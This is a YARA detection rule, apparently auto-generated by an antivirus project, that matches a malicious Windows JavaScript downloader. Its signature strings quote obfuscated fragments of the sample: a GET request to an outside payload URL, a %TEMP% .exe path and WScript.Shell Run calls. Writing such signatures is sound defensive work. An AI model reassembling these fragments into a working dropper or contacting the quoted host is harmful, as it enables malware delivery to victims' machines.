rule sig_20160328_09a1a3075ff7dacc0689c946e1390464 {
  meta:
    description = "datamaliciousorder - file 20160328_09a1a3075ff7dacc0689c946e1390464.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d308705c6c1424a3225385f0c65e924d173adcbf570649557280a9d934748bd"

  strings:
    $x1  = "function Vuulk() {return Bosmdxg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ITiywDlL2.exe\";};" fullword ascii
    $s2  = "Ztmvd[Xfwogb](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Ioedsfh](Apiknkn() * 11)} while (Ztmvd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Wetwjcg(Ijojcne, Tyqlrkwipd){return Ijojcne - Tyqlrkwipd;};" fullword ascii
    $s5  = "var Bosmdxg = function Qnzdnji() {return WScript[Szornh](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Lzpysj(Flbfu){Bosmdxg[\"Run\"](Flbfu, Fscljnzf, Fscljnzf);};" fullword ascii
    $s7  = "function Ignzk() {return ((Xrtkqgcpp == true) && (Xrtkqgcpp == Qupqjgkqkj)) ? 1 : Fscljnzf;};" fullword ascii
    $s8  = "function Ftwexonkfj(Agfmay) {var Ghuckgpo = (1, 2, 3, 4, 5, Agfmay); return Ghuckgpo;};" fullword ascii
    $s9  = "return Wetwjcg(Qmipyd, Aafanpsz);" fullword ascii
    $s10 = "function Mhgtikg(){return Szornh;};" fullword ascii
    $s11 = "var Xrtkqgcpp = false;" fullword ascii
    $s12 = "var Qfbmtaa = new this[\"Date\"]();" fullword ascii
    $s13 = " while (Onvltft){" fullword ascii
    $s14 = "var Qupqjgkqkj = false;" fullword ascii
    $s15 = "Xrtkqgcpp = true; " fullword ascii
    $s16 = "var Fskocrwjur = false;" fullword ascii
    $s17 = "function Uunxqp(){return Jiwkimhu;};" fullword ascii
    $s18 = "Qupqjgkqkj = true; " fullword ascii
    $s19 = "function Apiknkn(){return 22;};" fullword ascii
    $s20 = "function Dejobqmmy()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    1 of ($x*) and 4 of them
}